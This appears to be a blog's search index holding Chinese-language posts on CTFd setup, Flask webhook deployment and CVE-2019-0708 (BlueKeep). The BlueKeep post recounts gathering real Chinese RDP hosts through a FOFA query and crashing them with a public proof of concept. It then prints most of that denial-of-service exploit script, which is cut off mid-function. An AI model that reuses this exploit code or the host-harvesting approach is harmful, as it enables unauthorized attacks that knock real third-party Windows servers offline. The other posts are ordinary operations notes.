<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[置顶]]></title>
    <url>%2F2020%2F05%2F20%2FFirst%2F</url>
    <content type="text"><![CDATA[人生苦短我用python life is short, i have python.]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctfd搭建优化]]></title>
    <url>%2F2019%2F06%2F05%2Fctfd%E6%90%AD%E5%BB%BA%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[记录关于uwsgi搭建ctfd平台的方式，以及如何优化速度的方法。人生苦短我用python 0x01 准备环境阿里云Ubuntu服务器已经默认将源为阿里源 更新12apt updateapt upgrade 默认安装python3.5。下载pip3，更新pip3版本12apt install python3-pippip3 install --upgrade pip 此时pip报错from pip import main，更改pip3源码 1sudo vim /usr/bin/pip3 将原来的123from pip import mainif __name__ == &apos;__main__&apos;: sys.exit(main()) 修改为，注意__为两个下划线。123from pip import __main__if __name__ == &apos;__main__&apos;: sys.exit(__main__._main()) 下载ctfd源码，到home下的all路径 1234cd /home/mkdir allcd allgit clone https://github.com/CTFd/CTFd.git 0x02 测试搭建进入到CTFd的路径下，安装requirements.txt包。1pip3 insyall -r requirements.txt 使用python3运行serve.py 1python3 serve.py 不报错，此时为本地127网段4000端口，想要发布到公网需要修改为0.0.0.0 默认访问公网ip加端口4000，便能登录ctfd网站。 当然这样的启动方式是不友好的，首先python启动flask是单线程的，flask中gun服务性能非常低。所能承受的压力非常小，对服务器而言造成资源浪费。其次当服务宕机时，不能快速重启。 下面进行简单优化配置 0x03 使用uwsgi配置uwsgi的好处xxx 下载uwsgi服务12 0x04 nginx服务器0x05 监控0x06 优化]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>ctfd</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[flask持续自动化部署私有项目]]></title>
    <url>%2F2019%2F06%2F01%2Fflask%E6%8C%81%E7%BB%AD%E9%83%A8%E7%BD%B2%2F</url>
    <content type="text"><![CDATA[最近在维护一个企业官网的一个项目，当项目进行更新，便需要先上传github，然后进入到服务器进行pull项目，这个过程非常麻烦。介绍一个自己写的简单的项目持续部署。人生苦短我用python 产生背景对于一个持续集成的项目。需要我们为了需求持久的跟进。一次部署过程如下： 开发人员更新版本-&gt;推送到github仓库-&gt;登录到对应服务器-&gt;clone代码-&gt;测试部署效果 简单的部署一次两次并不会觉得麻烦。每次更新一点点代码都要去重复一遍部署过程。实在麻烦，之前就看到github上的webhook选项，一直没有用过。个人理解webhook就是一个能在github上发生事件的时候触发的钩子函数，这个flask中的hook差不多。这次是一个很好的实验过程。 为什么自己造轮子？ 在github上找到一个关于flask自动部署的项目，已有1K人start。看了他的思路，1觉得部署自己的项目没必要这么重，需要安装的三方应用太多。2.还是想着能有自己的思考的过程。 需求分析我们期望每次更新代码后都能够进行自动部署，只使用上图中的1、2步骤。减少3、4步骤的重复工作。 使用github的webhook需要一个公网url，它会自动测试这个公网的url能不能put访问。 项目仓库为私有仓库，所以在部署的过程中要稍微的麻烦一点。需要用到秘钥。 设计使用flask作为服务器应用，获取github上webhook的请求，然后本地执行请求下载仓库。部署到nginx服务器上。 对github进行配置，配置hook的域名与公钥。 服务器部署Git仓库能下载私有仓库。 实现####开发flask应用 核心代码12345678910111213141516171819#!/usr/bin/env python# encoding: utf-8from flask import Flask, requestimport shapp = Flask(__name__)@app.route(&apos;/api/git_hook/&apos;, methods=[&apos;POST&apos;])def git_hook(): sh.cd(&apos;/var/www/html/Doon&apos;) # 进入web项目的目录 # 执行pull操作 sh.git.pull([&apos;origin&apos;, &apos;master&apos;]) r = sh.service(&quot;nginx&quot;,&quot;stop&quot;,_ok_code=[1,2,3]) if r.exit_code == 0: return &apos;sucess&apos; else: return &apos;&lt;pre&gt;pull fali&lt;/pre&gt;&apos; if __name__ == &apos;__main__&apos;: app.run(port=5000) 部署nginx需要部署的项目是一个静态网站。使用nginx指定项目的路径，配置到服务器的80端口。 持续化部署应用服务部署到网站的非80端口。 123456location /api &#123; proxy_set_header X-REAL-IP $remote_addr; proxy_set_header Host $http_host; proxy_pass http://127.0.0.1:5000; &#125; 使用supervisor做flask应用管理。 服务器配置git仓库生成公钥 1ssh-keygen 保存到默认路径，输入空的pass 查看服务器上生成的.pub添加到github上 然后使用sh下载私有项目，不能再使用https传输。 github配置webhooks配置webhooks 演示效果本地上传github，查看服务器git仓库日志，发现已经自动更新。 之后nginx服务器重启。完美！]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-0708 windows 7 or 2008 R2 64]]></title>
    <url>%2F2019%2F05%2F31%2FCVE-2019-0708%E5%AF%B9windows2008R2%E2%80%A664%2F</url>
    <content type="text"><![CDATA[昨天有人在github上发布CVE-2019-0708的远程poc代码，这次针对windows server 2008 R2 x64做实验。人生苦短我用python经验证poc代码真是有效 不仅xp和03，win7、win2008等版本也可蓝屏… 靶机收集首先直接上fofa上搜集一波资产country=CN &amp;&amp; protocol==rdp，手动找到几个是windows 2008 的主机。 测试主机存活开启ping POC验证 这个poc可以让开启rdp协议的主机进入蓝屏 程序弹出socket 链接超时错误，远程主机Down掉。 听说源码可以改，看了看源码。………………能就行，就不hack底层了。 poc代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198import socket, sys, structfrom OpenSSL import SSLfrom impacket.structure import Structure# I&apos;m not responsible for what you use this to accomplish and should only be used for education purposes# Could clean these up since I don&apos;t even use themclass TPKT(Structure): commonHdr = ( (&apos;Version&apos;,&apos;B=3&apos;), (&apos;Reserved&apos;,&apos;B=0&apos;), (&apos;Length&apos;,&apos;&gt;H=len(TPDU)+4&apos;), (&apos;_TPDU&apos;,&apos;_-TPDU&apos;,&apos;self[&quot;Length&quot;]-4&apos;), (&apos;TPDU&apos;,&apos;:=&quot;&quot;&apos;), )class TPDU(Structure): commonHdr = ( (&apos;LengthIndicator&apos;,&apos;B=len(VariablePart)+1&apos;), (&apos;Code&apos;,&apos;B=0&apos;), (&apos;VariablePart&apos;,&apos;:=&quot;&quot;&apos;), ) def __init__(self, data = None): Structure.__init__(self,data) self[&apos;VariablePart&apos;]=&apos;&apos;class CR_TPDU(Structure): commonHdr = ( (&apos;DST-REF&apos;,&apos;&lt;H=0&apos;), (&apos;SRC-REF&apos;,&apos;&lt;H=0&apos;), (&apos;CLASS-OPTION&apos;,&apos;B=0&apos;), (&apos;Type&apos;,&apos;B=0&apos;), (&apos;Flags&apos;,&apos;B=0&apos;), (&apos;Length&apos;,&apos;&lt;H=8&apos;), )class DATA_TPDU(Structure): commonHdr = ( (&apos;EOT&apos;,&apos;B=0x80&apos;), (&apos;UserData&apos;,&apos;:=&quot;&quot;&apos;), ) def __init__(self, data = None): Structure.__init__(self,data) self[&apos;UserData&apos;] =&apos;&apos;class RDP_NEG_REQ(CR_TPDU): structure = ( (&apos;requestedProtocols&apos;,&apos;&lt;L&apos;), ) def __init__(self,data=None): CR_TPDU.__init__(self,data) if data is None: self[&apos;Type&apos;] = 1def send_init_packets(host): tpkt = TPKT() tpdu = TPDU() rdp_neg = RDP_NEG_REQ() rdp_neg[&apos;Type&apos;] = 1 rdp_neg[&apos;requestedProtocols&apos;] = 1 tpdu[&apos;VariablePart&apos;] = rdp_neg.getData() tpdu[&apos;Code&apos;] = 0xe0 tpkt[&apos;TPDU&apos;] = tpdu.getData() s = socket.socket() s.connect((host, 3389)) s.sendall(tpkt.getData()) s.recv(8192) ctx = SSL.Context(SSL.TLSv1_METHOD) tls = SSL.Connection(ctx,s) tls.set_connect_state() tls.do_handshake() return tls# This can be fixed length now buttfuckitdef send_client_data(tls): p = &quot;\x03\x00\x01\xca\x02\xf0\x80\x7f\x65\x82\x07\xc2\x04\x01\x01\x04\x01\x01\x01\x01\xff\x30\x19\x02\x01\x22\x02\x01\x02\x02\x01\x00\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x30\x19\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\x04\x20\x02\x01\x02\x30\x1c\x02\x02\xff\xff\x02\x02\xfc\x17\x02\x02\xff\xff\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xff\xff\x02\x01\x02\x04\x82\x01\x61\x00\x05\x00\x14\x7c\x00\x01\x81\x48\x00\x08\x00\x10\x00\x01\xc0\x00\x44\x75\x63\x61\x81\x34\x01\xc0\xea\x00\x0a\x00\x08\x00\x80\x07\x38\x04\x01\xca\x03\xaa\x09\x04\x00\x00\xee\x42\x00\x00\x44\x00\x45\x00\x53\x00\x4b\x00\x54\x00\x4f\x00\x50\x00\x2d\x00\x46\x00\x38\x00\x34\x00\x30\x00\x47\x00\x49\x00\x4b\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xca\x01\x00\x00\x00\x00\x00\x18\x00\x0f\x00\xaf\x07\x62\x00\x63\x00\x37\x00\x38\x00\x65\x00\x66\x00\x36\x00\x33\x00\x2d\x00\x39\x00\x64\x00\x33\x00\x33\x00\x2d\x00\x34\x00\x31\x00\x39\x38\x00\x38\x00\x2d\x00\x39\x00\x32\x00\x63\x00\x66\x00\x2d\x00\x00\x31\x00\x62\x00\x32\x00\x64\x00\x61\x00\x42\x42\x42\x42\x07\x00\x01\x00\x00\x00\x56\x02\x00\x00\x50\x01\x00\x00\x00\x00\x64\x00\x00\x00\x64\x00\x00\x00\x04\xc0\x0c\x00\x15\x00\x00\x00\x00\x00\x00\x00\x02\xc0\x0c\x00\x1b\x00\x00\x00\x00\x00\x00\x00\x03\xc0\x38\x00\x04\x00\x00\x00\x72\x64\x70\x73\x6e\x64\x00\x00\x0f\x00\x00\xc0\x63\x6c\x69\x70\x72\x64\x72\x00\x00\x00\xa0\xc0\x64\x72\x64\x79\x6e\x76\x63\x00\x00\x00\x80\xc0\x4d\x53\x5f\x54\x31\x32\x30\x00\x00\x00\x00\x00&quot; size0 = struct.pack(&quot;&gt;h&quot;, len(p)) size1 = struct.pack(&quot;&gt;h&quot;, len(p)-12) size2 = struct.pack(&quot;&gt;h&quot;, len(p)-109) size3 = struct.pack(&quot;&gt;h&quot;, len(p)-118) size4 = struct.pack(&quot;&gt;h&quot;, len(p)-132) size5 = struct.pack(&quot;&gt;h&quot;, len(p)-390) ba = bytearray() ba.extend(map(ord, p)) ba[2] = size0[0] ba[3] = size0[1] ba[10] = size1[0] ba[11] = size1[1] ba[107] = size2[0] ba[108] = size2[1] ba[116] = 0x81 ba[117] = size3[1] ba[130] = 0x81 ba[131] = size4[1] ba[392] = size5[1] tls.sendall(bytes(ba)) tls.recv(8192)def send_client_info(tls): p = b&quot;\x03\x00\x01\x61\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x81\x52\x40\x00\xa1\xa5\x09\x04\x09\x04\xbb\x47\x03\x00\x00\x00\x0e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x74\x00\x65\x00\x73\x00\x74\x00\x00\x00\x00\x00\x00\x00\x02\x00\x1c\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x41\x41\x41\x00\x38\x00\x2e\x00\x32\x00\x33\x00\x32\x00\x2e\x00\x31\x00\x00\x00\x40\x00\x43\x00\x3a\x00\x5c\x00\x57\x00\x49\x00\x4e\x00\x41\x41\x41\x00\x57\x00\x53\x00\x5c\x00\x73\x00\x79\x00\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x6d\x00\x73\x00\x74\x00\x73\x00\x63\x00\x61\x00\x78\x00\x2e\x00\x64\x00\x6c\x00\x6c\x00\x00\x00\xa4\x01\x00\x00\x4d\x00\x6f\x00\x75\x00\x6e\x00\x74\x00\x61\x00\x69\x00\x6e\x00\x20\x00\x53\x00\x74\x00\x61\x00\x6e\x00\x64\x00\x61\x00\x72\x00\x64\x00\x20\x00\x54\x00\x69\x00\x6d\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4d\x00\x6f\x00\x75\x00\x6e\x00\x74\x00\x61\x00\x69\x00\x6e\x00\x20\x00\x44\x00\x61\x00\x79\x00\x6c\x00\x69\x00\x67\x00\x68\x00\x74\x00\x20\x00\x54\x00\x69\x00\x6d\x00\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\x00\x00\xc4\xff\xff\xff\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x64\x00\x00\x00&quot; tls.sendall(p)def send_channel_packets(tls): p1 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00&quot; tls.sendall(p1) p2 = b&quot;\x03\x00\x00\x08\x02\xf0\x80\x28&quot; tls.sendall(p2) tls.recv(1024) p4 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xeb&quot; tls.sendall(p4) tls.recv(1024) p5 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xec&quot; tls.sendall(p5) tls.recv(1024) p6 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xed&quot; tls.sendall(p6) tls.recv(1024) p7 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xee&quot; tls.sendall(p7) tls.recv(1024) p8 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x07\x03\xef&quot; tls.sendall(p8) tls.recv(1024)def send_confirm_active(tls, shareid): p = &quot;\x03\x00\x02\x63\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x82\x54\x54\x02\x13\x00\xf0\x03\xea\x03\x01\x00\xea\x03\x06\x00\x3e\x02\x4d\x53\x54\x53\x43\x00\x17\x00\x00\x00\x01\x00\x18\x00\x01\x00\x03\x00\x00\x02\x00\x00\x00\x00\x1d\x04\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x1c\x00\x20\x00\x01\x00\x01\x00\x01\x00\x80\x07\x38\x04\x00\x00\x01\x00\x01\x00\x00\x1a\x01\x00\x00\x00\x03\x00\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x14\x00\x00\x00\x01\x00\x00\x00\xaa\x00\x01\x01\x01\x01\x01\x00\x00\x01\x01\x01\x00\x01\x00\x00\x00\x01\x01\x01\x01\x01\x01\x01\x01\x00\x01\x01\x01\x00\x00\x00\x00\x00\xa1\x06\x06\x00\x00\x00\x00\x00\x00\x84\x03\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x13\x00\x28\x00\x03\x00\x00\x03\x78\x00\x00\x00\x78\x00\x00\x00\xfc\x09\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x08\x00\x06\x00\x00\x00\x07\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x0c\x00\x00\x00\x00\x00\x02\x00\x02\x00\x08\x00\x0a\x00\x01\x00\x14\x00\x15\x00\x09\x00\x08\x00\x00\x00\x00\x00\x0d\x00\x58\x00\x91\x00\x20\x00\x09\x04\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x08\x00\x01\x00\x00\x00\x0e\x00\x08\x00\x01\x00\x00\x00\x10\x00\x34\x00\xfe\x00\x04\x00\xfe\x00\x04\x00\xfe\x00\x08\x00\xfe\x00\x08\x00\xfe\x00\x10\x00\xfe\x00\x20\x00\xfe\x00\x40\x00\xfe\x00\x80\x00\xfe\x00\x00\x01\x40\x00\x00\x08\x00\x01\x00\x01\x03\x00\x00\x00\x0f\x00\x08\x00\x01\x00\x00\x00\x11\x00\x0c\x00\x01\x00\x00\x00\x00\x28\x64\x00\x14\x00\x0c\x00\x01\x00\x00\x00\x00\x00\x00\x00\x15\x00\x0c\x00\x02\x00\x00\x00\x00\x0a\x00\x01\x1a\x00\x08\x00\xaf\x94\x00\x00\x1c\x00\x0c\x00\x12\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x06\x00\x01\x00\x1e\x00\x08\x00\x01\x00\x00\x00\x18\x00\x0b\x00\x02\x00\x00\x00\x03\x0c\x00\x1d\x00\x5f\x00\x02\xb9\x1b\x8d\xca\x0f\x00\x4f\x15\x58\x9f\xae\x2d\x1a\x87\xe2\xd6\x01\x03\x00\x01\x01\x03\xd4\xcc\x44\x27\x8a\x9d\x74\x4e\x80\x3c\x0e\xcb\xee\xa1\x9c\x54\x05\x31\x00\x31\x00\x00\x00\x01\x00\x00\x00\x25\x00\x00\x00\xc0\xcb\x08\x00\x00\x00\x01\x00\xc1\xcb\x1d\x00\x00\x00\x01\xc0\xcf\x02\x00\x08\x00\x00\x01\x40\x00\x02\x01\x01\x01\x00\x01\x40\x00\x02\x01\x01\x04&quot; ba = bytearray() ba.extend(map(ord, p)) tls.sendall(bytes(ba))def send_establish_session(tls): p = b&quot;\x03\x00\x00\x24\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x16\x16\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x08\x00\x1f\x00\x00\x00\x01\x00\xea\x03&quot; tls.sendall(p) p = b&quot;\x03\x00\x00\x28\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x1a\x1a\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x0c\x00\x14\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00&quot; tls.sendall(p) p = b&quot;\x03\x00\x00\x28\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x1a\x1a\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x0c\x00\x14\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; tls.sendall(p) p = b&quot;\x03\x00\x05\x81\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x85\x72\x72\x05\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\xa9\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa9\x00\x00\x00\x00\x00\x02\x00\x00\x00\xa3\xce\x20\x35\xdb\x94\xa5\xe6\x0d\xa3\x8c\xfb\x64\xb7\x63\xca\xe7\x9a\x84\xc1\x0d\x67\xb7\x91\x76\x71\x21\xf9\x67\x96\xc0\xa2\x77\x5a\xd8\xb2\x74\x4f\x30\x35\x2b\xe7\xb0\xd2\xfd\x81\x90\x1a\x8f\xd5\x5e\xee\x5a\x6d\xcb\xea\x2f\xa5\x2b\x06\xe9\x0b\x0b\xa6\xad\x01\x2f\x7a\x0b\x7c\xff\x89\xd3\xa3\xe1\xf8\x00\x96\xa6\x8d\x9a\x42\xfc\xab\x14\x05\x8f\x16\xde\xc8\x05\xba\xa0\xa8\xed\x30\xd8\x67\x82\xd7\x9f\x84\xc3\x38\x27\xda\x61\xe3\xa8\xc3\x65\xe6\xec\x0c\xf6\x36\x24\xb2\x0b\xa6\x17\x1f\x46\x30\x16\xc7\x73\x60\x14\xb5\xf1\x3a\x3c\x95\x7d\x7d\x2f\x74\x7e\x56\xff\x9c\xe0\x01\x32\x9d\xf2\xd9\x35\x5e\x95\x78\x2f\xd5\x15\x6c\x18\x34\x0f\x43\xd7\x2b\x97\xa9\xb4\x28\xf4\x73\x6c\x16\xdb\x43\xd7\xe5\x58\x0c\x5a\x03\xe3\x73\x58\xd7\xd9\x76\xc2\xfe\x0b\xd7\xf4\x12\x43\x1b\x70\x6d\x74\xc2\x3d\xf1\x26\x60\x58\x80\x31\x07\x0e\x85\xa3\x95\xf8\x93\x76\x99\x9f\xec\xa0\xd4\x95\x5b\x05\xfa\x4f\xdf\x77\x8a\x7c\x29\x9f\x0b\x4f\xa1\xcb\xfa\x95\x66\xba\x47\xe3\xb0\x44\xdf\x83\x03\x44\x24\xf4\x1e\xf2\xe5\xcb\xa9\x53\x04\xc2\x76\xcb\x4d\xc6\xc2\xd4\x3f\xd3\x8c\xb3\x7c\xf3\xaa\xf3\x93\xfe\x25\xbd\x32\x7d\x48\x6e\x93\x96\x68\xe5\x18\x2b\xea\x84\x25\x69\x02\xa5\x38\x65\x6f\x0f\x9f\xf6\xa1\x3a\x1d\x22\x9d\x3f\x6d\xe0\x4c\xee\x8b\x24\xf0\xdc\xff\x70\x52\xa7\x0d\xf9\x52\x8a\x1e\x33\x1a\x30\x11\x15\xd7\xf8\x95\xa9\xbb\x74\x25\x8c\xe3\xe9\x93\x07\x43\xf5\x50\x60\xf7\x96\x2e\xd3\xff\x63\xe0\xe3\x24\xf1\x10\x3d\x8e\x0f\x56\xbc\x2e\xb8\x90\x0c\xfa\x4b\x96\x68\xfe\x59\x68\x21\xd0\xff\x52\xfe\x5c\x7d\x90\xd4\x39\xbe\x47\x9d\x8e\x7a\xaf\x95\x4f\x10\xea\x7b\x7a\xd3\xca\x07\x28\x3e\x4e\x4b\x81\x0e\xf1\x5f\x1f\x8d\xbe\x06\x40\x27\x2f\x4a\x03\x80\x32\x67\x54\x2f\x93\xfd\x25\x5d\x6d\xa0\xad\x23\x45\x72\xff\xd1\xeb\x5b\x51\x75\xa7\x61\xe0\x3f\xe4\xef\xf4\x96\xcd\xa5\x13\x8a\xe6\x52\x74\x70\xbf\xc1\xf9\xfb\x68\x9e\xdd\x72\x8f\xb4\x44\x5f\x3a\xcb\x75\x2a\x20\xa6\x69\xd2\x76\xf9\x57\x46\x2b\x5b\xda\xba\x0f\x9b\xe0\x60\xe1\x8b\x90\x33\x41\x0a\x2d\xc5\x06\xfe\xd0\xf0\xfc\xde\x35\xd4\x1e\xaa\x76\x0b\xae\xf4\xd5\xbd\xfa\xf3\x55\xf5\xc1\x67\x65\x75\x1c\x1d\x5e\xe8\x3a\xfe\x54\x50\x23\x04\xae\x2e\x71\xc2\x76\x97\xe6\x39\xc6\xb2\x25\x87\x92\x63\x52\x61\xd1\x6c\x07\xc1\x1c\x00\x30\x0d\xa7\x2f\x55\xa3\x4f\x23\xb2\x39\xc7\x04\x6c\x97\x15\x7a\xd7\x24\x33\x91\x28\x06\xa6\xe7\xc3\x79\x5c\xae\x7f\x50\x54\xc2\x38\x1e\x90\x23\x1d\xd0\xff\x5a\x56\xd6\x12\x91\xd2\x96\xde\xcc\x62\xc8\xee\x9a\x44\x07\xc1\xec\xf7\xb6\xd9\x9c\xfe\x30\x1c\xdd\xb3\x3b\x93\x65\x3c\xb4\x80\xfb\xe3\x87\xf0\xee\x42\xd8\xcf\x08\x98\x4d\xe7\x6b\x99\x0a\x43\xed\x13\x72\x90\xa9\x67\xfd\x3c\x63\x36\xec\x55\xfa\xf6\x1f\x35\xe7\x28\xf3\x87\xa6\xce\x2e\x34\xaa\x0d\xb2\xfe\x17\x18\xa2\x0c\x4e\x5f\xf0\xd1\x98\x62\x4a\x2e\x0e\xb0\x8d\xb1\x7f\x32\x52\x8e\x87\xc9\x68\x7c\x0c\xef\xee\x88\xae\x74\x2a\x33\xff\x4b\x4d\xc5\xe5\x18\x38\x74\xc7\x28\x83\xf7\x72\x87\xfc\x79\xfb\x3e\xce\xd0\x51\x13\x2d\x7c\xb4\x58\xa2\xe6\x28\x67\x4f\xec\xa6\x81\x6c\xf7\x9a\x29\xa6\x3b\xca\xec\xb8\xa1\x27\x50\xb7\xef\xfc\x81\xbf\x5d\x86\x20\x94\xc0\x1a\x0c\x41\x50\xa9\x5e\x10\x4a\x82\xf1\x74\x1f\x78\x21\xf5\x70\x61\x24\x00\x3d\x47\x5f\xf3\x25\x80\x3c\x4b\xea\xa3\xf4\x77\xea\xa1\x42\x1a\x17\x0f\x6d\xa8\x35\x9e\x91\x26\x34\x43\x04\xc6\xc6\x5b\x21\x7d\x8c\xc7\x22\x91\x7b\x2c\x2d\x2f\xd6\x7e\xa5\x52\xa8\x08\x80\xeb\x60\xd1\x44\x09\x8e\x3c\xa1\xaa\x67\x60\x0a\x26\xc6\xb5\xc6\x79\xa6\x4f\x8b\x8c\x25\x5c\xf1\x0b\x23\xf4\xd8\xa6\x6d\xf1\x91\x78\xf9\xe5\x2a\x50\x2f\x5a\x44\x22\xd9\x19\x5c\xaf\xd6\xac\x97\xa2\xf8\x0d\x0c\xe3\xdd\x88\x48\x98\x28\x0b\x8b\xbd\x76\xdc\xde\xca\xe2\xc2\x4a\x87\x50\xd4\x8c\x77\x5a\xd8\xb2\x74\x4f\x30\x35\xbf\x28\xae\xd9\xa2\x98\xa5\xbc\x60\xca\xb8\x90\x4d\x20\x46\xd9\x8a\x1a\x30\x01\x8b\x38\x63\x1a\x57\x09\x51\x46\x95\x9b\xd8\x80\x0c\xb0\x77\x24\xbf\x2b\xd3\x57\x22\xd9\x19\x5c\xaf\xd6\xac\x97\xa2\xf8\x0d\x0c\xe3\xdd\x88\x48\x98\x28\x0b\x8b\xbd\x76\xdc\xde\xca\xe2\xc2\x4a\x87\x50\xd4\x8c\x56\x92\x38\xed\x6b\x9b\x5b\x1f\xba\x53\xa1\x0e\xf7\x75\x10\x53\x22\x4c\x0a\x75\x88\x54\x69\x3f\x3b\xf3\x18\x67\x6b\x0f\x19\xd1\x00\x25\x86\xcd\xa8\xd9\xdd\x1d\x8d\x26\x87\x54\xd9\x79\xc0\x74\x65\x90\xd7\x33\x32\xaf\xba\x9d\x5a\xd5\x6c\x7c\xa1\x47\xe1\x49\x6e\x1c\xce\x9f\x62\xaa\x26\x16\x3f\x3c\xec\x5b\x49\xe5\xc0\x60\xd4\xbe\xa7\x88\xbc\xa1\x9f\x29\x71\x8c\xeb\x69\xf8\x73\xfb\xaf\x29\xaa\x40\x1b\xe5\x92\xd2\x77\xa7\x2b\xfb\xb6\x77\xb7\x31\xfb\xdc\x1e\x63\x63\x7d\xf2\xfe\x3c\x6a\xba\x0b\x20\xcb\x9d\x64\xb8\x31\x14\xe2\x70\x07\x2c\xdf\x9c\x6f\xb5\x3a\xc4\xd5\xb5\xc9\x3e\x9a\xd7\xd5\x30\xdc\x0e\x19\x89\xc6\x08\x88\xe1\xca\x81\xa6\x28\xdd\x9c\x74\x05\x11\xe7\xe1\xcc\xbc\xc7\x76\xdd\x55\xe2\xcc\xc2\xcb\xd3\xb6\x48\x01\xdd\xff\xba\xca\x31\xab\x26\x44\x1c\xdc\x06\x01\xdf\xf2\x90\x50\xb8\x6b\x8f\xe8\x29\xf0\xba\xec\xfb\x2d\xfd\x7a\xfc\x7f\x57\xbd\xea\x90\xf7\xcf\x92\x1e\xc4\x20\xd0\xb6\x9f\xd6\xdc\xa1\x82\xa9\x6c\x5e\x3e\x83\x41\x57\x73\xe9\xe7\x5a\x3f\xda\x24\x4f\x73\x5e\xf4\xe0\x92\x24\xbd\x0b\xd0\x3c\x49\x96\xb5\xb5\x05\x32\xcb\x58\x1d\x6f\x97\x51\xee\x0c\xdc\x0b\x2a\x60\xef\x97\x3e\x5a\x30\x81\x15\x91\xcf\x11\x07\x25\x2c\x41\xdb\x70\x72\xe1\x75\xf6\xa5\xff\xe8\x44\xe7\x03\xe3\x61\xaa\xdb\xe0\x07\x3d\x07\x0b\xe3\x5c\x09\xa9\x5e\x10\xfd\xcf\x74\x9e\x23\xf1\x30\x86\x16\xef\x25\x4e\xfe\xa4\x93\xa5\x80\x0a\x01\x39\xcc\x11\x7a\x6e\x94\x22\x5b\xd8\xc6\xc9\xa8\xdf\x13\x96\xb3\x91\x33\x6e\x87\xbb\x94\x63\x2d\x88\x64\xa7\x58\x89\xda\xdc\x7f\x2a\xe3\xa1\x66\xe5\xc8\x7f\xc2\xdb\xc7\x7d\x2f\xa9\x46\x28\x45\x69\xbc\xac\x9f\x85\x9e\xb0\x9f\x9a\x49\xb4\xb1\xcb&quot; tls.sendall(p) p = b&quot;\x03\x00\x00\x28\x02\xf0\x80\x64\x00\x07\x03\xeb\x70\x1a\x1a\x00\x17\x00\xf0\x03\xea\x03\x01\x00\x00\x01\x00\x00\x27\x00\x00\x00\x00\x00\x00\x00\x03\x00\x32\x00&quot; tls.sendall(p)def send_kill_packet(tls, arch): if arch == 